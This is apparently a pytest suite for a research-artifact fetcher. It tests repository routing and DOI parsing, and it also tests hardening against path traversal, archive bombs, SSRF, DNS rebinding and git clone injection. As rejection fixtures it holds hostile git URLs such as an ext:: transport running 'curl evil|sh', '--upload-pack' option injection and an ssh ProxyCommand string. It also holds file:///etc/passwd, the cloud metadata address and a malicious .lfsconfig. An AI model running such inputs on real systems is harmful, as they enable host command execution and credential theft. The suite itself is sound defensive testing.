"""Fetcher routing, id/DOI parsing, URL normalization, host-side path safety,
and checksum honesty. Pure (no network, no Docker): everything here inspects
strings, tmp_path trees, or crafted archive members."""

import io
import subprocess
import tarfile

import pytest

import reprobe.fetch.base as base
from reprobe.fetch.base import (FetchError, _check_tar_member, checksum_verdict,
                                maybe_unzip, new_checksum_stats, record_download,
                                run_git, safe_join)
from reprobe.fetch.dataverse import DataverseFetcher
from reprobe.fetch.dryad import _DOI as DRYAD_DOI
from reprobe.fetch.figshare import _parse as fig_parse
from reprobe.fetch.git_host import GitHostFetcher, normalize_browser_url
from reprobe.fetch.osf import _decide_pin
from reprobe.fetch.registry import _DOI_LIKE, configure, select
from reprobe.fetch.software_heritage import _SWHID


def _name(ref):
    f = select(ref)
    return f.name if f else None


@pytest.mark.parametrize("ref,expected", [
    ("https://figshare.com/articles/dataset/foo/12345678", "figshare"),
    ("10.6084/m9.figshare.12345678", "figshare"),
    ("https://datadryad.org/stash/dataset/doi:10.5061/dryad.abc123", "dryad"),
    ("10.5061/dryad.abc123", "dryad"),
    ("https://osf.io/ab12c/", "osf"),
    ("10.17605/OSF.IO/AB12C", "osf"),
    ("https://dataverse.harvard.edu/dataset.xhtml?persistentId=doi:10.7910/DVN/ABCDEF", "dataverse"),
    ("swh:1:dir:0000000000000000000000000000000000000000", "software_heritage"),
    ("https://archive.softwareheritage.org/swh:1:dir:0000000000000000000000000000000000000000", "software_heritage"),
    ("https://zenodo.org/records/123456", "zenodo"),
    ("https://github.com/foo/bar", "git"),
    ("https://anonymous.4open.science/r/foo-1234", "anonymous_github"),
])
def test_routing(ref, expected):
    assert _name(ref) == expected


def test_unmatched_is_none():
    assert _name("not-a-real-reference-xyz") is None


def test_id_and_doi_parsing():
    assert fig_parse("10.6084/m9.figshare.99887766") == ("99887766", None)
    assert DRYAD_DOI.search("doi:10.5061/dryad.q2bvt").group(1) == "10.5061/dryad.q2bvt"
    assert _SWHID.search("swh:1:rev:" + "a" * 40).group(1).startswith("swh:1:rev:")


def test_doi_like_matches():
    assert _DOI_LIKE.search("10.5281/zenodo.1")
    assert _DOI_LIKE.search("https://doi.org/10.6084/m9.figshare.1")
    assert not _DOI_LIKE.search("https://example.com/notadoi")


# --- figshare version-explicit references -----------------------------------

@pytest.mark.parametrize("ref,expected", [
    ("10.6084/m9.figshare.12345.v2", ("12345", "2")),
    ("10.6084/m9.figshare.12345", ("12345", None)),
    ("https://figshare.com/articles/dataset/My_Title/12345/2", ("12345", "2")),
    ("https://figshare.com/articles/dataset/My_Title/12345", ("12345", None)),
    ("https://doi.org/10.6084/m9.figshare.12345.v13", ("12345", "13")),
    ("not-figshare", (None, None)),
])
def test_figshare_version_parsing(ref, expected):
    assert fig_parse(ref) == expected


# --- browser-URL normalization ----------------------------------------------

@pytest.mark.parametrize("ref,expected", [
    ("https://github.com/user/repo", ("https://github.com/user/repo", None)),
    ("https://github.com/user/repo/", ("https://github.com/user/repo", None)),
    ("https://github.com/user/repo?tab=readme-ov-file", ("https://github.com/user/repo", None)),
    ("https://github.com/user/repo/tree/main", ("https://github.com/user/repo", "main")),
    ("https://github.com/user/repo/blob/main/analysis.ipynb", ("https://github.com/user/repo", "main")),
    ("https://github.com/user/repo/commit/abc1234", ("https://github.com/user/repo", "abc1234")),
    ("https://github.com/user/repo/releases/tag/v1.0", ("https://github.com/user/repo", "v1.0")),
    ("https://github.com/user/repo/releases", ("https://github.com/user/repo", None)),
    ("https://gitlab.com/group/sub/repo", ("https://gitlab.com/group/sub/repo", None)),
    ("https://gitlab.com/group/sub/repo/-/tree/dev", ("https://gitlab.com/group/sub/repo", "dev")),
    ("https://gitlab.com/group/sub/repo/-/blob/main/run.py", ("https://gitlab.com/group/sub/repo", "main")),
    ("https://gitlab.com/group/sub/repo/-/tags/v2", ("https://gitlab.com/group/sub/repo", "v2")),
    ("https://bitbucket.org/user/repo/src/main/x.py", ("https://bitbucket.org/user/repo", None)),
    # unknown host / non-http refs pass through verbatim
    ("https://example.com/a/b/tree/main", ("https://example.com/a/b/tree/main", None)),
    ("git@github.com:user/repo.git", ("git@github.com:user/repo.git", None)),
])
def test_normalize_browser_url(ref, expected):
    assert normalize_browser_url(ref) == expected


def test_normalize_uses_extra_hosts():
    hosts = ("github.com", "gitlab.lrz.de")
    assert normalize_browser_url("https://gitlab.lrz.de/g/sub/r/-/tree/main", hosts) == \
        ("https://gitlab.lrz.de/g/sub/r", "main")


# --- chair-configurable hosts (config/pins.yaml fetch:) ----------------------

def test_extra_git_hosts():
    assert not GitHostFetcher().can_handle("https://gitlab.lrz.de/group/repo")
    assert GitHostFetcher(extra_hosts=("gitlab.lrz.de",)).can_handle("https://gitlab.lrz.de/group/repo")


def test_extra_dataverse_hosts():
    url = "https://darus.uni-stuttgart.de/dataset.xhtml?persistentId=doi:10.18419/darus-1"
    assert not DataverseFetcher().can_handle(url)
    assert DataverseFetcher(extra_hosts=("darus.uni-stuttgart.de",)).can_handle(url)


def test_registry_configure_roundtrip():
    try:
        assert _name("https://gitlab.lrz.de/group/repo") is None
        configure({"extra_git_hosts": ["gitlab.lrz.de"], "dataverse_hosts": ["darus.uni-stuttgart.de"]})
        assert _name("https://gitlab.lrz.de/group/repo") == "git"
        assert _name("https://darus.uni-stuttgart.de/dataset.xhtml?persistentId=doi:10.18419/x") == "dataverse"
    finally:
        configure(None)


# --- host-side path safety: safe_join ----------------------------------------

@pytest.mark.parametrize("name,tail", [
    ("plain.txt", ("plain.txt",)),
    ("sub/dir/file.txt", ("sub", "dir", "file.txt")),        # directory-style Zenodo keys survive
    ("../../evil.py", ("evil.py",)),
    ("..\\..\\evil.py", ("evil.py",)),
    ("/etc/passwd", ("etc", "passwd")),
    ("C:\\Users\\evil.bat", ("Users", "evil.bat")),
    ("../", ("file",)),                                       # nothing left: safe placeholder
])
def test_safe_join_contains(tmp_path, name, tail):
    out = safe_join(tmp_path, name)
    assert out == tmp_path.joinpath(*tail)
    assert out.resolve().is_relative_to(tmp_path.resolve())


# --- host-side path safety: tar extraction -----------------------------------

def _make_tar(path, names):
    with tarfile.open(path, "w:gz") as t:
        for name in names:
            data = b"boom"
            info = tarfile.TarInfo(name)
            info.size = len(data)
            t.addfile(info, io.BytesIO(data))


def test_maybe_unzip_good_tar(tmp_path):
    dest = tmp_path / "dest"
    dest.mkdir()
    _make_tar(dest / "deposit.tar.gz", ["data/results.csv"])
    warnings = []
    maybe_unzip(dest, warnings)
    assert (dest / "data" / "results.csv").read_bytes() == b"boom"
    assert warnings == []


def test_maybe_unzip_rejects_traversal_tar(tmp_path):
    dest = tmp_path / "dest"
    dest.mkdir()
    _make_tar(dest / "deposit.tar.gz", ["../escaped.txt"])
    warnings = []
    maybe_unzip(dest, warnings)
    assert not (tmp_path / "escaped.txt").exists()
    assert any("could not extract archive" in w for w in warnings)


def test_maybe_unzip_contains_absolute_member(tmp_path):
    # the stdlib data filter strips the leading slash; the manual fallback
    # rejects it — either way nothing may land outside dest
    dest = tmp_path / "dest"
    dest.mkdir()
    _make_tar(dest / "deposit.tar.gz", ["/abs_escaped.txt"])
    warnings = []
    maybe_unzip(dest, warnings)
    assert not (tmp_path / "abs_escaped.txt").exists()
    extracted = dest / "abs_escaped.txt"
    assert warnings or extracted.resolve().is_relative_to(dest.resolve())


def _tarinfo(name, typ=tarfile.REGTYPE, linkname=""):
    info = tarfile.TarInfo(name)
    info.type = typ
    info.linkname = linkname
    return info


@pytest.mark.parametrize("info", [
    _tarinfo("../x"),
    _tarinfo("a/../../x"),
    _tarinfo("/abs"),
    _tarinfo("C:\\evil.bat"),
    _tarinfo("link", tarfile.SYMTYPE, "/etc/passwd"),
    _tarinfo("sub/link", tarfile.SYMTYPE, "../../outside"),
    _tarinfo("hard", tarfile.LNKTYPE, "../outside"),
    _tarinfo("dev", tarfile.CHRTYPE),
])
def test_check_tar_member_rejects(info):
    with pytest.raises(ValueError):
        _check_tar_member(info)


@pytest.mark.parametrize("info", [
    _tarinfo("ok.txt"),
    _tarinfo("sub/dir/ok.txt"),
    _tarinfo("sub", tarfile.DIRTYPE),
    _tarinfo("sub/link", tarfile.SYMTYPE, "sibling.txt"),
    _tarinfo("sub/link2", tarfile.SYMTYPE, "../other/x"),     # stays inside dest
])
def test_check_tar_member_allows(info):
    _check_tar_member(info)


# --- checksum honesty ---------------------------------------------------------

def test_checksums_all_verified():
    stats = new_checksum_stats()
    record_download(stats, True, "checksum verified", True)
    record_download(stats, True, "checksum verified", True)
    warnings = []
    assert checksum_verdict(stats, warnings) is True
    assert warnings == []


def test_checksums_none_provided():
    stats = new_checksum_stats()
    record_download(stats, True, "downloaded (no checksum provided)", False)
    warnings = []
    assert checksum_verdict(stats, warnings) is False
    assert any("platform provided no checksums" in w for w in warnings)


def test_checksums_partial_coverage():
    stats = new_checksum_stats()
    record_download(stats, True, "checksum verified", True)
    record_download(stats, True, "downloaded (no checksum provided)", False)
    warnings = []
    assert checksum_verdict(stats, warnings) is True
    assert any("no platform checksum" in w for w in warnings)


def test_checksums_mismatch_or_failure_never_verify():
    stats = new_checksum_stats()
    record_download(stats, True, "checksum verified", True)
    record_download(stats, False, "checksum mismatch", True)
    assert checksum_verdict(stats, []) is False
    assert stats["mismatch"] == 1

    stats = new_checksum_stats()
    record_download(stats, True, "checksum verified", True)
    record_download(stats, False, "download failed: boom", False)
    assert checksum_verdict(stats, []) is False
    assert stats["failed"] == 1


# --- OSF pin honesty ----------------------------------------------------------

def test_osf_pin_registration_with_doi():
    pin, warnings = _decide_pin("registrations", "10.17605/OSF.IO/AB12C", "ab12c")
    assert (pin.kind, pin.value) == ("version_doi", "10.17605/OSF.IO/AB12C")
    assert warnings == []


@pytest.mark.parametrize("node_type,doi", [
    ("nodes", "10.17605/OSF.IO/AB12C"),   # DOI on mutable project storage: not archival
    ("nodes", None),
    ("registrations", None),              # frozen but no minted DOI
])
def test_osf_pin_never_fabricated(node_type, doi):
    pin, warnings = _decide_pin(node_type, doi, "ab12c")
    assert pin.kind == "none"
    assert warnings


# --- run_git failure modes ------------------------------------------------------

def test_run_git_not_installed(monkeypatch):
    def boom(*a, **k):
        raise FileNotFoundError(2, "git")
    monkeypatch.setattr(base.subprocess, "run", boom)
    with pytest.raises(FetchError, match="not installed"):
        run_git(["clone", "x"])


def test_run_git_timeout(monkeypatch):
    def boom(*a, **k):
        raise subprocess.TimeoutExpired(cmd=["git", "clone"], timeout=600)
    monkeypatch.setattr(base.subprocess, "run", boom)
    with pytest.raises(FetchError, match="timed out after 600s"):
        run_git(["clone", "x"])


# --- git clone hostile-input hardening (trust boundary: clone runs on host) ----

import reprobe.fetch.git_host as git_host
from reprobe.fetch.git_host import _reject_unsafe_clone_url, _reject_unsafe_ref


@pytest.mark.parametrize("url", [
    "ext::sh -c 'touch /tmp/pwned' #x.git",   # ext remote-helper -> host command execution
    "ext::sh -c whoami x.git",
    "fd::17/x.git",                            # fd transport
    "-upload-pack=touch x.git",               # option-shaped ref
    "--upload-pack=payload",
    "file:///etc/passwd",                     # local exfiltration transport
    "/local/path/x.git",                      # bare local path (not a fetchable URL)
    "ssh -oProxyCommand=evil x.git",
])
def test_reject_unsafe_clone_url(url):
    with pytest.raises(FetchError):
        _reject_unsafe_clone_url(url)


@pytest.mark.parametrize("url", [
    "https://github.com/user/repo",
    "http://gitlab.lrz.de/g/r.git",
    "git://example.com/x.git",
    "ssh://git@host/x.git",
    "git@github.com:user/repo.git",
])
def test_accept_safe_clone_url(url):
    _reject_unsafe_clone_url(url)   # must not raise


@pytest.mark.parametrize("ref", ["--theirs", "-x", "--upload-pack=evil"])
def test_reject_unsafe_checkout_ref(ref):
    with pytest.raises(FetchError):
        _reject_unsafe_ref(ref)


def test_fetch_refuses_hostile_ref_before_clone(tmp_path, monkeypatch):
    """A crafted `.git` ref that selects git's ext:: transport must be rejected
    BEFORE run_git is ever called — no command may reach the host."""
    called = []
    monkeypatch.setattr(git_host, "run_git",
                        lambda *a, **k: called.append(a) or pytest.fail("run_git must not run"))
    for ref in ("ext::sh -c 'curl evil|sh' #x.git", "-upload-pack=x.git"):
        # routing accepts it (ends in .git), but fetch must refuse it
        assert GitHostFetcher().can_handle(ref)
        with pytest.raises(FetchError):
            GitHostFetcher().fetch(ref, tmp_path / "src")
    assert called == []


def test_clone_argv_uses_double_dash(tmp_path, monkeypatch):
    """The clone argv must place `--` before the URL so a URL can never be
    parsed as a git option."""
    seen = {}

    def fake_git(args, cwd=None, timeout=600):
        seen.setdefault("argvs", []).append(list(args))
        if args[0] == "rev-parse":
            return subprocess.CompletedProcess(args, 0, stdout="deadbeef\n", stderr="")
        if args[0] == "lfs":
            return subprocess.CompletedProcess(args, 1, stdout="", stderr="")
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    monkeypatch.setattr(git_host, "run_git", fake_git)
    GitHostFetcher().fetch("https://github.com/user/repo", tmp_path / "src")
    clone_argv = seen["argvs"][0]
    assert clone_argv[:3] == ["clone", "--quiet", "--"]
    assert clone_argv[3] == "https://github.com/user/repo"


def test_run_git_sets_protocol_allowlist(monkeypatch):
    """run_git must whitelist only network transports (blocking ext::/fd::/file::)."""
    captured = {}

    def capture(argv, **kwargs):
        captured["env"] = kwargs.get("env", {})
        return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

    monkeypatch.setattr(base.subprocess, "run", capture)
    run_git(["rev-parse", "HEAD"])
    allow = captured["env"].get("GIT_ALLOW_PROTOCOL", "")
    assert allow and "ext" not in allow.split(":") and "file" not in allow.split(":")
    assert "https" in allow.split(":")


# --- download byte cap + archive-bomb guards (host DoS) ----------------------

class _FakeResp:
    def __init__(self, chunks, headers=None):
        self._chunks = list(chunks)
        self.headers = headers or {}
    def __enter__(self): return self
    def __exit__(self, *a): return False
    def raise_for_status(self): pass
    def iter_content(self, n): yield from self._chunks


def _fake_session(resp):
    class S:
        def get(self, url, **k): return resp
    return S()


def test_download_streams_over_cap_aborts(tmp_path, monkeypatch):
    monkeypatch.setattr(base, "_SESSION", _fake_session(_FakeResp([b"x" * 50, b"y" * 50])))
    ok, note = base.download("http://x/f", tmp_path / "f.bin", max_bytes=10)
    assert not ok and "cap" in note.lower()
    assert not (tmp_path / "f.bin").exists()          # partial file removed


def test_download_content_length_cap(tmp_path, monkeypatch):
    monkeypatch.setattr(base, "_SESSION", _fake_session(_FakeResp([], headers={"Content-Length": "999"})))
    ok, note = base.download("http://x/f", tmp_path / "f.bin", max_bytes=10)
    assert not ok and "oversized" in note.lower()


def test_download_under_cap_ok(tmp_path, monkeypatch):
    monkeypatch.setattr(base, "_SESSION", _fake_session(_FakeResp([b"hello"])))
    ok, _ = base.download("http://x/f", tmp_path / "f.bin", max_bytes=1000)
    assert ok and (tmp_path / "f.bin").read_bytes() == b"hello"


class _Redirect:
    is_redirect = True
    is_permanent_redirect = False

    def __init__(self, location):
        self.headers = {"Location": location}

    def close(self):
        pass


def test_download_restrict_public_refuses_redirect_to_internal(tmp_path, monkeypatch):
    """A validated public host that 302s to an internal address must be refused
    (SSRF TOCTOU): restrict_public re-checks every redirect hop."""
    class S:
        def get(self, url, **k):
            return _Redirect("http://169.254.169.254/latest/meta-data/")   # -> internal
    monkeypatch.setattr(base, "_SESSION", S())
    ok, note = base.download("https://93.184.216.34/x", tmp_path / "f.bin", restrict_public=True)
    assert not ok and "internal" in note.lower()
    assert not (tmp_path / "f.bin").exists()


def test_maybe_unzip_rejects_zip_bomb(tmp_path, monkeypatch):
    import zipfile
    monkeypatch.setattr(base, "_MAX_EXTRACT_BYTES", 10)
    dest = tmp_path / "d"; dest.mkdir()
    with zipfile.ZipFile(dest / "deposit.zip", "w") as z:
        z.writestr("big.txt", b"x" * 100)
    warnings = []
    maybe_unzip(dest, warnings)
    assert not (dest / "big.txt").exists()
    assert any("bomb" in w or "cap" in w for w in warnings)


def test_maybe_unzip_rejects_too_many_members(tmp_path, monkeypatch):
    import zipfile
    monkeypatch.setattr(base, "_MAX_ARCHIVE_MEMBERS", 1)
    dest = tmp_path / "d"; dest.mkdir()
    with zipfile.ZipFile(dest / "deposit.zip", "w") as z:
        z.writestr("a.txt", b"a"); z.writestr("b.txt", b"b")
    warnings = []
    maybe_unzip(dest, warnings)
    assert any("too many members" in w for w in warnings)


def test_maybe_unzip_rejects_tar_bomb(tmp_path, monkeypatch):
    monkeypatch.setattr(base, "_MAX_EXTRACT_BYTES", 2)   # _make_tar writes 4 bytes/file
    dest = tmp_path / "d"; dest.mkdir()
    _make_tar(dest / "deposit.tar.gz", ["big.txt"])
    warnings = []
    maybe_unzip(dest, warnings)
    assert not (dest / "big.txt").exists()
    assert any("bomb" in w or "cap" in w for w in warnings)


def test_dataverse_rejects_ssrf_host():
    f = DataverseFetcher()
    # 'dataverse' only in the query, an internal host — must NOT be handled
    assert not f.can_handle("http://169.254.169.254/dataset?persistentId=doi:10.1/x&note=dataverse")
    # a real Dataverse host is still handled
    assert f.can_handle("https://dataverse.harvard.edu/dataset.xhtml?persistentId=doi:10.7910/DVN/AB")


# --- SSRF guard for author-declared download / LFS URLs (IP literals: no DNS) --

@pytest.mark.parametrize("host", ["127.0.0.1", "10.0.0.5", "192.168.1.1",
                                  "169.254.169.254", "172.16.0.1", "0.0.0.0", "::1",
                                  # IPv4-mapped / 6to4 wrappers must not hide an internal v4
                                  "::ffff:169.254.169.254", "::ffff:10.0.0.1"])
def test_is_public_host_rejects_internal_ips(host):
    assert base.is_public_host(host) is False


@pytest.mark.parametrize("host", ["93.184.216.34", "8.8.8.8",
                                  "2606:2800:220:1:248:1893:25c8:1946"])
def test_is_public_host_allows_public_ips(host):
    assert base.is_public_host(host) is True


def test_is_public_host_empty_is_false():
    assert base.is_public_host("") is False


def test_assert_safe_url_enforces_scheme_and_host():
    assert base.assert_safe_url("https://93.184.216.34/data.csv") == "93.184.216.34"
    for bad in ("ftp://example.com/x", "file:///etc/passwd",
                "http://169.254.169.254/latest/meta-data/", "http://127.0.0.1/x"):
        with pytest.raises(FetchError):
            base.assert_safe_url(bad)


def test_pinned_dns_uses_validated_addrs_and_restores(monkeypatch):
    """The DNS pin closes the rebind window: inside the context the validated
    addrinfos are used even if the resolver would now answer with an internal
    address, other hosts still resolve normally, and the stdlib global is
    restored afterwards (even on exception)."""
    import socket as _s

    private = [(2, 1, 6, "", ("10.0.0.5", 80))]      # what a rebind would answer
    elsewhere = [(2, 1, 6, "", ("1.2.3.4", 80))]

    def rebinding(host, port, *a, **k):              # never touches real DNS
        return private if host == "evil.example" else elsewhere

    monkeypatch.setattr(_s, "getaddrinfo", rebinding)
    pinned = [(2, 1, 6, "", ("93.184.216.34", 80))]
    with base._pinned_dns("evil.example", pinned):
        assert _s.getaddrinfo("evil.example", 80) == pinned      # pin wins over the rebind
        assert _s.getaddrinfo("other.example", 80) == elsewhere  # other hosts fall through
    assert _s.getaddrinfo is rebinding, "getaddrinfo not restored"

    try:
        with base._pinned_dns("evil.example", pinned):
            raise RuntimeError("boom")
    except RuntimeError:
        pass
    assert _s.getaddrinfo is rebinding, "getaddrinfo not restored after an exception"


def test_resolve_public_rejects_mixed_and_unresolvable(monkeypatch):
    import socket as _s

    # a name resolving to BOTH a public and a private address must be refused
    monkeypatch.setattr(_s, "getaddrinfo",
                        lambda *a, **k: [(2, 1, 6, "", ("93.184.216.34", 80)),
                                         (2, 1, 6, "", ("10.0.0.5", 80))])
    with pytest.raises(FetchError):
        base._resolve_public("mixed.example", 80)

    def boom(*a, **k):
        raise OSError("dns down")
    monkeypatch.setattr(_s, "getaddrinfo", boom)
    with pytest.raises(FetchError, match="cannot resolve host"):
        base._resolve_public("nxdomain.example", 80)


def test_allow_lfs_reaches_the_git_fetcher(tmp_path, monkeypatch):
    """The positive --allow-lfs chain (registry.fetch -> GitHostFetcher.fetch ->
    _pull_lfs) must actually issue the pull; otherwise the flag is a silent
    no-op and a chair gets pointer files with no error."""
    from reprobe.fetch import registry as reg

    calls = []

    def fake_git(args, cwd=None, timeout=600):
        calls.append(list(args))
        if args[0] == "rev-parse":
            return subprocess.CompletedProcess(args, 0, stdout="deadbeef\n", stderr="")
        if args[:2] == ["lfs", "version"]:
            return subprocess.CompletedProcess(args, 0, stdout="git-lfs/3", stderr="")
        if args[:2] == ["lfs", "ls-files"]:
            return subprocess.CompletedProcess(args, 0, stdout="d.bin\n", stderr="")
        if args[:3] == ["config", "--get", "remote.origin.url"]:
            return subprocess.CompletedProcess(args, 0, stdout="https://93.184.216.34/r.git\n", stderr="")
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    monkeypatch.setattr(git_host, "run_git", fake_git)
    dest = tmp_path / "src"
    dest.mkdir()
    (dest / "d.bin").write_text(_lfs_pointer(10))
    reg.fetch("https://github.com/user/repo", dest, allow_lfs=True)
    assert ["lfs", "pull"] in calls, "registry did not forward allow_lfs to the git fetcher"


def test_run_git_ignores_system_config(monkeypatch):
    """run_git must set GIT_CONFIG_NOSYSTEM so a host /etc/gitconfig can't inject
    a credential helper or transport, and keep skip-smudge on by default."""
    captured = {}

    def capture(argv, **kwargs):
        captured["env"] = kwargs.get("env", {})
        return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

    monkeypatch.setattr(base.subprocess, "run", capture)
    run_git(["rev-parse", "HEAD"])
    assert captured["env"].get("GIT_CONFIG_NOSYSTEM") == "1"
    assert captured["env"].get("GIT_LFS_SKIP_SMUDGE") == "1"


# --- opt-in git-lfs smudge hardening (host RCE / SSRF / DoS surface) ----------

def _lfs_pointer(size: int) -> str:
    return f"version https://git-lfs.github.com/spec/v1\noid sha256:{'a' * 64}\nsize {size}\n"


def _origin(url):
    """A run_git stub factory that reports remote.origin.url = url."""
    def fake_git(args, cwd=None, timeout=600):
        if args[:3] == ["config", "--get", "remote.origin.url"]:
            return subprocess.CompletedProcess(args, 0, stdout=f"{url}\n", stderr="")
        if args[:2] == ["lfs", "ls-files"]:
            return subprocess.CompletedProcess(args, 0, stdout="d.bin\n", stderr="")
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")
    return fake_git


def test_lfs_neutralizes_committed_lfsconfig(tmp_path, monkeypatch):
    # ANY committed .lfsconfig — endpoint keys (remote.origin.lfsurl, lfs.pushurl),
    # transfer agents, credential helpers — is renamed away before the pull, so
    # git-lfs uses the origin-derived endpoint and honors none of it.
    (tmp_path / ".lfsconfig").write_text(
        '[remote "origin"]\n  lfsurl = http://169.254.169.254/x\n'
        "[lfs]\n  standalonetransferagent = evil\n")
    (tmp_path / "d.bin").write_text(_lfs_pointer(10))
    calls = []
    fg = _origin("https://93.184.216.34/r.git")
    monkeypatch.setattr(git_host, "run_git", lambda *a, **k: calls.append(list(a[0])) or fg(*a, **k))
    warns: list[str] = []
    git_host._pull_lfs(tmp_path, warns)
    assert not (tmp_path / ".lfsconfig").is_file()
    assert (tmp_path / ".lfsconfig.reprobe-disabled").is_file()
    assert ["lfs", "pull"] in calls
    assert any("ignored the repo's committed .lfsconfig" in w for w in warns)


def test_lfs_refuses_internal_origin(tmp_path, monkeypatch):
    (tmp_path / "d.bin").write_text(_lfs_pointer(10))

    def fake_git(args, cwd=None, timeout=600):
        if args[:3] == ["config", "--get", "remote.origin.url"]:
            return subprocess.CompletedProcess(args, 0, stdout="http://10.0.0.5/r.git\n", stderr="")
        if args[:2] == ["lfs", "pull"]:
            pytest.fail("must not pull when origin resolves to an internal host")
        return subprocess.CompletedProcess(args, 0, stdout="d.bin\n", stderr="")

    monkeypatch.setattr(git_host, "run_git", fake_git)
    warns: list[str] = []
    git_host._pull_lfs(tmp_path, warns)
    assert any("non-public host" in w for w in warns)


def test_lfs_pull_refused_when_payload_exceeds_cap(tmp_path, monkeypatch):
    (tmp_path / "big.bin").write_text(_lfs_pointer(999_999_999_999))

    def fake_git(args, cwd=None, timeout=600):
        if args[:3] == ["config", "--get", "remote.origin.url"]:
            return subprocess.CompletedProcess(args, 0, stdout="", stderr="")   # no origin -> skip
        if args[:2] == ["lfs", "ls-files"]:
            return subprocess.CompletedProcess(args, 0, stdout="big.bin\n", stderr="")
        pytest.fail(f"pull must not run once the cap is exceeded (got {args})")

    monkeypatch.setattr(git_host, "run_git", fake_git)
    monkeypatch.setattr(git_host, "_MAX_LFS_TOTAL_BYTES", 1000)
    warns: list[str] = []
    git_host._pull_lfs(tmp_path, warns)
    assert any("exceeds" in w and "cap" in w for w in warns)


def test_lfs_pull_success_within_cap(tmp_path, monkeypatch):
    (tmp_path / "d.bin").write_text(_lfs_pointer(10))
    calls = []
    fg = _origin("https://93.184.216.34/r.git")
    monkeypatch.setattr(git_host, "run_git", lambda *a, **k: calls.append(list(a[0])) or fg(*a, **k))
    warns: list[str] = []
    git_host._pull_lfs(tmp_path, warns)
    assert ["lfs", "pull"] in calls
    assert any("pulled 1 file" in w for w in warns)


def test_fetch_default_keeps_skip_smudge(tmp_path, monkeypatch):
    """Without --allow-lfs, an LFS repo keeps the skip-smudge warning and never
    pulls (default-safe)."""
    def fake_git(args, cwd=None, timeout=600):
        if args[0] == "rev-parse":
            return subprocess.CompletedProcess(args, 0, stdout="deadbeef\n", stderr="")
        if args[:2] == ["lfs", "version"]:
            return subprocess.CompletedProcess(args, 0, stdout="git-lfs/3", stderr="")
        if args[0] == "lfs":
            pytest.fail("no LFS pull may run without allow_lfs")
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    monkeypatch.setattr(git_host, "run_git", fake_git)
    res = GitHostFetcher().fetch("https://github.com/user/repo", tmp_path / "src")
    assert any("skip-smudge" in w for w in res.warnings)
